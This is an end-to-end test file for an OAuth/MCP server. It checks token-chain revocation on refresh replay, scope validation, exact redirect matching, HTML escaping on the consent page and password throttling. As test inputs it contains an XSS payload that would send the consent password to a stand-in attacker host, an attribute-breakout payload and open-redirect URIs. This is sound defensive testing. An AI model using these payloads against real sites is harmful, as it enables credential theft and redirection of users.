import { createHash, randomBytes } from 'node:crypto';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { buildApplication, type Application } from '../../../src/app.js';
import { createNullLogger } from '../../../src/logging/logger.js';
import { createHttpApp, startHttpServer, type HttpServerHandle } from '../../../src/server/http.js';

/**
 * End-to-end cover for the access-token chain wiring in `issueTokenPair` and
 * the refresh grant.
 *
 * The unit tests for reuse detection call `store.issueToken` with an explicit
 * `parentToken`, which proves the STORE links and revokes correctly but says
 * nothing about whether the SERVER actually passes the parent. That wiring was
 * written wrong once - it minted a second, orphaned refresh token to be the
 * parent - and was caught by hand rather than by a test. A regression that
 * dropped the argument would leave every pair unlinked and every one of those
 * unit tests still green.
 *
 * This drives the real HTTP server with the replay grace set to zero, so a
 * replay is classified as theft immediately, and then asks the resource
 * server whether the access token still works. Only correct wiring can make
 * that access token die.
 */

const ADMIN_PASSWORD = 'correct-horse-battery-staple';
const REDIRECT_URI = 'https://claude.ai/api/mcp/auth_callback';

let dir: string;
let app: Application;
let handle: HttpServerHandle;
let base: string;
let issuer: string;

function pkce(): { verifier: string; challenge: string } {
  const verifier = randomBytes(48).toString('base64url');
  return { verifier, challenge: createHash('sha256').update(verifier, 'ascii').digest('base64url') };
}

async function form(path: string, body: Record<string, string>): Promise<Response> {
  return fetch(`${base}${path}`, {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams(body).toString(),
    redirect: 'manual',
  });
}

/** Ask the resource server whether an access token is still accepted. */
async function callMcp(accessToken: string): Promise<number> {
  const res = await fetch(`${base}/mcp`, {
    method: 'POST',
    headers: {
      'content-type': 'application/json',
      accept: 'application/json, text/event-stream',
      authorization: `Bearer ${accessToken}`,
    },
    body: JSON.stringify({
      jsonrpc: '2.0',
      id: 1,
      method: 'initialize',
      params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 't', version: '1' } },
    }),
  });
  await res.text();
  return res.status;
}

async function fullFlow(): Promise<{ accessToken: string; refreshToken: string; clientId: string }> {
  const reg = await fetch(`${base}/oauth/register`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ client_name: 'Chain', redirect_uris: [REDIRECT_URI] }),
  });
  const { client_id: clientId } = (await reg.json()) as { client_id: string };
  const { verifier, challenge } = pkce();
  const page = await fetch(
    `${base}/oauth/authorize?${new URLSearchParams({
      client_id: clientId,
      redirect_uri: REDIRECT_URI,
      response_type: 'code',
      code_challenge: challenge,
      code_challenge_method: 'S256',
      state: 'xyz',
      resource: `${issuer}/mcp`,
    })}`,
  );
  const requestId = /name="request_id" value="([^"]+)"/.exec(await page.text())![1]!;
  const consent = await form('/oauth/authorize', { request_id: requestId, password: ADMIN_PASSWORD, approve: 'yes' });
  const code = new URL(consent.headers.get('location')!).searchParams.get('code')!;
  const tokenRes = await form('/oauth/token', {
    grant_type: 'authorization_code',
    code,
    redirect_uri: REDIRECT_URI,
    client_id: clientId,
    code_verifier: verifier,
  });
  const tokens = (await tokenRes.json()) as { access_token: string; refresh_token: string };
  return { accessToken: tokens.access_token, refreshToken: tokens.refresh_token, clientId };
}

beforeAll(async () => {
  dir = mkdtempSync(join(tmpdir(), 'oauth-chain-'));
  issuer = 'https://mcp.test.example';
  writeFileSync(
    join(dir, 'orchestrator.yaml'),
    [
      'server:', '  host: 127.0.0.1', '  port: 0', '  auth:', '    mode: oauth',
      `    resourceUrl: ${issuer}`, '    scopesSupported: [mcp]',
      // Zero grace: any replay is theft, so the theft path is reachable in a test.
      '    refreshReplayGraceMs: 0',
      'database:', `  path: ${join(dir, 'chain.sqlite')}`,
      'memory:', '  enabled: false', '  provider: none', '',
    ].join('\n'),
  );
  app = await buildApplication({
    configPath: join(dir, 'orchestrator.yaml'),
    cwd: dir,
    env: { MCP_ORCHESTRATOR_ADMIN_PASSWORD: ADMIN_PASSWORD },
    logger: createNullLogger(),
  });
  const { app: expressApp } = createHttpApp(app.services, {
    isReady: async () => ({ ready: true }),
    env: { MCP_ORCHESTRATOR_ADMIN_PASSWORD: ADMIN_PASSWORD },
  });
  handle = await startHttpServer(expressApp, '127.0.0.1', 0, createNullLogger());
  base = `http://127.0.0.1:${handle.port}`;
}, 60_000);

afterAll(async () => {
  await handle?.close();
  await app?.shutdown();
  rmSync(dir, { recursive: true, force: true });
});

describe('access tokens are chained by the server, not just by the store', () => {
  it('kills the rotated access token when theft is detected', async () => {
    const { refreshToken, clientId } = await fullFlow();

    // Rotate: this mints the access token whose parent the refresh grant sets.
    const rotated = await form('/oauth/token', {
      grant_type: 'refresh_token', refresh_token: refreshToken, client_id: clientId,
    });
    expect(rotated.status).toBe(200);
    const next = (await rotated.json()) as { access_token: string };
    expect(await callMcp(next.access_token)).toBe(200);

    // Replay the spent token. Grace is zero, so this is theft.
    const replay = await form('/oauth/token', {
      grant_type: 'refresh_token', refresh_token: refreshToken, client_id: clientId,
    });
    expect(replay.status).toBe(400);
    await replay.text();

    // Only correct server-side linkage can make this fail.
    expect(await callMcp(next.access_token)).toBe(401);
  }, 30_000);

  it('kills the originally issued access token too', async () => {
    const { accessToken, refreshToken, clientId } = await fullFlow();
    expect(await callMcp(accessToken)).toBe(200);

    await (await form('/oauth/token', {
      grant_type: 'refresh_token', refresh_token: refreshToken, client_id: clientId,
    })).text();
    await (await form('/oauth/token', {
      grant_type: 'refresh_token', refresh_token: refreshToken, client_id: clientId,
    })).text();

    // The access token from issueTokenPair is parented to the replayed token,
    // which is the walk's starting point, so it must be revoked.
    expect(await callMcp(accessToken)).toBe(401);
  }, 30_000);

  it('leaves another session of the same client working', async () => {
    const first = await fullFlow();
    const second = await fullFlow();
    expect(await callMcp(second.accessToken)).toBe(200);

    await (await form('/oauth/token', {
      grant_type: 'refresh_token', refresh_token: first.refreshToken, client_id: first.clientId,
    })).text();
    await (await form('/oauth/token', {
      grant_type: 'refresh_token', refresh_token: first.refreshToken, client_id: first.clientId,
    })).text();

    expect(await callMcp(first.accessToken)).toBe(401);
    // The untouched session must survive a theft verdict on the other one.
    expect(await callMcp(second.accessToken)).toBe(200);
  }, 30_000);
});

/**
 * The consent page renders the requested scope, and the resource server does
 * not enforce scope at all - it checks audience only. So an unvalidated scope
 * let a crafted authorize link show the user a narrower permission than the
 * token it produced. The consent screen exists so the user can see what they
 * are approving; it must not be able to show them attacker-supplied text.
 */
describe('requested scope is validated before it is shown to anyone', () => {
  async function authorizeWith(scope: string | undefined): Promise<Response> {
    const reg = await fetch(`${base}/oauth/register`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ client_name: 'Scope', redirect_uris: [REDIRECT_URI] }),
    });
    const { client_id: clientId } = (await reg.json()) as { client_id: string };
    const { challenge } = pkce();
    const params: Record<string, string> = {
      client_id: clientId,
      redirect_uri: REDIRECT_URI,
      response_type: 'code',
      code_challenge: challenge,
      code_challenge_method: 'S256',
      state: 'xyz',
      resource: `${issuer}/mcp`,
    };
    if (scope !== undefined) params['scope'] = scope;
    return fetch(`${base}/oauth/authorize?${new URLSearchParams(params)}`, { redirect: 'manual' });
  }

  it('refuses a scope this server does not support', async () => {
    const res = await authorizeWith('admin:everything');

    expect(res.status).toBe(302);
    const target = new URL(res.headers.get('location')!);
    expect(target.searchParams.get('error')).toBe('invalid_scope');
    // The state must come back so a conforming client can correlate.
    expect(target.searchParams.get('state')).toBe('xyz');
  });

  it('never renders an unsupported scope on the consent page', async () => {
    const res = await authorizeWith('read-only-diagnostics');

    // A redirect, not a page: the crafted string never reaches the user.
    expect(res.status).toBe(302);
    expect(res.headers.get('location')).not.toContain('read-only-diagnostics');
  });

  it('refuses a request mixing a supported and an unsupported scope', async () => {
    const res = await authorizeWith('mcp admin:everything');
    expect(res.status).toBe(302);
    expect(new URL(res.headers.get('location')!).searchParams.get('error')).toBe('invalid_scope');
  });

  it('accepts the supported scope and shows it', async () => {
    const res = await authorizeWith('mcp');
    expect(res.status).toBe(200);
    expect(await res.text()).toContain('mcp');
  });

  it('treats a present-but-blank scope as absent rather than refusing', async () => {
    const res = await authorizeWith('');
    // A client sending `scope=` still gets the default rather than an error.
    expect(res.status).toBe(200);
    await res.text();
  });

  it('still works with no scope parameter at all', async () => {
    const res = await authorizeWith(undefined);
    expect(res.status).toBe(200);
    await res.text();
  });
});

/**
 * redirect_uri must match EXACTLY. The comment above the check calls a prefix
 * match "the classic open-redirect bug", and a mutation sweep showed nothing
 * tested it: turning `includes` into a `startsWith` left all 377 tests green.
 */
describe('redirect_uri is matched exactly', () => {
  const REGISTERED = 'https://claude.ai/api/mcp/auth_callback';

  async function authorizeWithRedirect(redirectUri: string): Promise<Response> {
    const reg = await fetch(`${base}/oauth/register`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ client_name: 'Redirect', redirect_uris: [REGISTERED] }),
    });
    const { client_id: clientId } = (await reg.json()) as { client_id: string };
    const { challenge } = pkce();
    return fetch(
      `${base}/oauth/authorize?${new URLSearchParams({
        client_id: clientId,
        redirect_uri: redirectUri,
        response_type: 'code',
        code_challenge: challenge,
        code_challenge_method: 'S256',
        state: 'xyz',
        resource: `${issuer}/mcp`,
      })}`,
      { redirect: 'manual' },
    );
  }

  it('refuses a redirect_uri that merely starts with a registered one', async () => {
    const attacker = `${REGISTERED}.attacker.example/steal`;
    expect(attacker.startsWith(REGISTERED)).toBe(true);

    const res = await authorizeWithRedirect(attacker);

    // Must be refused outright - NOT a consent page, and NOT a redirect to
    // the attacker, either of which would be the open redirect.
    expect(res.status).toBe(400);
    expect(res.headers.get('location')).toBeNull();
  }, 30_000);

  it.each([
    `https://claude.ai/api/mcp/auth_callback/extra`,
    `https://claude.ai/api/mcp/auth_callback?next=https://evil.example`,
    `http://claude.ai/api/mcp/auth_callback`,
    `https://claude.ai/api/mcp/auth_callbackX`,
  ])('refuses %s', async (candidate) => {
    const res = await authorizeWithRedirect(candidate);
    expect(res.status).toBe(400);
  }, 30_000);

  it('still serves the consent page for the exact registered value', async () => {
    const res = await authorizeWithRedirect(REGISTERED);
    expect(res.status).toBe(200);
    await res.text();
  }, 30_000);
});

/**
 * client_name arrives through the UNAUTHENTICATED /oauth/register endpoint and
 * is rendered into the consent page. That page is where the human types the
 * admin password, so unescaped attacker markup there is stored XSS aimed
 * squarely at the one human secret in the system. escapeHtml is applied - and
 * nothing tested it, so removing it was invisible.
 */
describe('the consent page escapes attacker-supplied text', () => {
  async function consentPageFor(clientName: string): Promise<string> {
    const reg = await fetch(`${base}/oauth/register`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ client_name: clientName, redirect_uris: [REDIRECT_URI] }),
    });
    const { client_id: clientId } = (await reg.json()) as { client_id: string };
    const { challenge } = pkce();
    const page = await fetch(
      `${base}/oauth/authorize?${new URLSearchParams({
        client_id: clientId,
        redirect_uri: REDIRECT_URI,
        response_type: 'code',
        code_challenge: challenge,
        code_challenge_method: 'S256',
        state: 'xyz',
        resource: `${issuer}/mcp`,
      })}`,
    );
    expect(page.status).toBe(200);
    return page.text();
  }

  it('does not emit a script tag from a client name', async () => {
    const html = await consentPageFor('<script>fetch("//evil.example?p="+document.forms[0].password.value)</script>');

    expect(html).not.toContain('<script>fetch');
    // The name is still shown, just inert.
    expect(html).toContain('&lt;script&gt;');
  }, 30_000);

  it('does not let a client name break out of the attribute or element', async () => {
    const html = await consentPageFor('" onmouseover="alert(1)" x="');
    expect(html).not.toContain('onmouseover="alert(1)"');
  }, 30_000);

  it('escapes the ampersand and angle brackets rather than dropping them', async () => {
    const html = await consentPageFor('Tom & Jerry <Ltd>');
    expect(html).toContain('Tom &amp; Jerry &lt;Ltd&gt;');
  }, 30_000);
});

/**
 * The consent password is the only human secret in the system and the consent
 * POST is the one place it is checked, which makes it the one place worth
 * brute forcing. A FixedWindowThrottle(5, 5min) guards it; the existing test
 * made exactly one wrong attempt, so deleting the throttle passed.
 */
describe('the consent password cannot be guessed without limit', () => {
  it('starts refusing after repeated wrong passwords', async () => {
    const reg = await fetch(`${base}/oauth/register`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ client_name: 'Throttle', redirect_uris: [REDIRECT_URI] }),
    });
    const { client_id: clientId } = (await reg.json()) as { client_id: string };

    let sawThrottled = false;
    let sawRejected = false;
    for (let attempt = 0; attempt < 10; attempt += 1) {
      const { challenge } = pkce();
      const page = await fetch(
        `${base}/oauth/authorize?${new URLSearchParams({
          client_id: clientId,
          redirect_uri: REDIRECT_URI,
          response_type: 'code',
          code_challenge: challenge,
          code_challenge_method: 'S256',
          state: 'xyz',
          resource: `${issuer}/mcp`,
        })}`,
      );
      const requestId = /name="request_id" value="([^"]+)"/.exec(await page.text())?.[1];
      if (requestId === undefined) break;
      const res = await form('/oauth/authorize', { request_id: requestId, password: `wrong-${attempt}`, approve: 'yes' });
      await res.text();
      if (res.status === 401) sawRejected = true;
      if (res.status === 429) { sawThrottled = true; break; }
    }

    expect(sawRejected).toBe(true);
    // Without a throttle every one of the ten would simply be a 401.
    expect(sawThrottled).toBe(true);
  }, 60_000);
});
